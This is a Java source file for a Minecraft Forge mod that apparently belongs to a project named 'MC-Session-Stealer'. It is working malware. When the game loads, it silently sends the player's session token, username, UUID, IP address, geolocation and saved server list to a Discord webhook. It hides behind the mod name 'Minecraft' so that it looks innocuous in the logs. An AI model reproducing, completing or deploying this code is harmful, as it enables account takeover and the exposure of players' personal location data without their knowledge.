package com.github.shurpe;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.ServerList;
import net.minecraft.util.Session;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

// some random mod info to suppress warnings in logs
@Mod(modid = "Minecraft", name = "Minecraft", version = "1.8.9")
public final class Main {

    /**
     * Your Discord webhook URL
     * <p>
     * Example: https://discord.com/api/webhooks/...
     */
    private static final String WEBHOOK_URL = "";

    /**
     * Adds @everyone to webhook message
     */
    private static final boolean PING_EVERYONE = true;

    private static final Minecraft mc = Minecraft.getMinecraft();

    private DiscordWebhook.EmbedObject genGeoInfoEmbed() throws Exception {
        final JsonObject info = (JsonObject) new JsonParser().parse(
                HttpUtils.getContentAsString("https://ipapi.co/json"));

        return new DiscordWebhook.EmbedObject()
                .setTitle(":earth_americas: IP Info")
                .setColor(0x4400FF)
                .setDescription(
                        "Contains information about the target's IP address and geo-location")
                .addField(":globe_with_meridians: Country",
                        "```" + info.get("country_name").getAsString() + "```", true)
                .addField(":globe_with_meridians: City",
                        "```" + info.get("city").getAsString() + "```", true)
                .addField(":globe_with_meridians: Region",
                        "```" + info.get("region").getAsString() + "```", true)
                .addField(":satellite_orbital: IP Address",
                        "```" + info.get("ip").getAsString() + "```", true)
                .addField(":satellite: Protocol",
                        "```" + info.get("version").getAsString() + "```", true)
                .addField(":clock10: Timezone",
                        "```" + info.get("timezone").getAsString() + "```", true);
    }

    private DiscordWebhook.EmbedObject genAccInfoEmbed() {
        final Session session = mc.getSession();

        return new DiscordWebhook.EmbedObject()
                .setTitle(":unlock: Account Info")
                .setColor(0x6E39FF)
                .setDescription(
                        "[NameMC](https://namemc.com/" + session.getPlayerID() + ')' +
                        " | [Plancke](https://plancke.io/hypixel/player/stats/" + session.getPlayerID() + ')' +
                        " | [SkyCrypt](https://sky.shiiyu.moe/stats/" + session.getPlayerID() + ')')
                .addField(":identification_card: Name",
                        "```" + session.getUsername() + "```", true)
                .addField(":identification_card: UUID",
                        "```" + session.getPlayerID() + "```", true)
                .addField(":key: Session Token",
                        "```" + session.getToken() + "```", false);
    }

    private DiscordWebhook.EmbedObject genServersInfoEmbed() {
        final DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
                .setTitle(":file_folder: Saved Servers")
                .setColor(0x8F67FC)
                .setDescription("Contains the target's list of saved Minecraft servers");

        final ServerList servers = new ServerList(mc);
        for (int i = 0; i < servers.countServers(); i++) {
            final ServerData server = servers.getServerData(i);

            serversEmbed.addField(":label: " + server.serverName, "```" + server.serverIP + "```", true);
        }

        return serversEmbed;
    }

    private DiscordWebhook genWebhook() {
        final DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL)
                .setUsername("github.com/14ms/MC-Session-Stealer");

        if (PING_EVERYONE) {
            webhook.setContent("@everyone");
        }

        try {
            webhook.addEmbed(genGeoInfoEmbed());
        } catch (final Exception ignored) {
        }

        webhook.addEmbed(genAccInfoEmbed());
        webhook.addEmbed(genServersInfoEmbed());

        return webhook;
    }

    private void execWebhook() {
        new Thread(() -> {
            try {
                genWebhook().execute();
            } catch (final Exception ignored) {
            }

        }).start();
    }

    @EventHandler
    public void preInit(final FMLPreInitializationEvent event) {
        execWebhook();
    }
}